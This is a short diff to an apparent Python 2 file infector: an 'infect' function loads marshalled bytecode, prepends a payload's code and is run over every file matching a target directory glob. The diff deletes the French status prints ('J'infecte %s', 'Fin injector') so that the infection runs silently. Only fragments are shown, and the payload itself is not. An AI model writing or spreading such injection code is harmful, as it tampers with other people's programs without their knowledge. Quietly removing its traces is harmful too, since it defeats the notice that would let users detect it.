@@ -20,7 +20,6 @@ def infect(f_to_infect):
 
     data = Code.from_code(marshal.loads(f.read()))
 
-    print "J'infecte %s" % f_to_infect
     f.close()
 
     data.code[:0] = payload.code
@@ -38,5 +37,3 @@ else:
 
 for i in glob.glob(target_dir):
     infect(i)
-
-print "Fin injector"
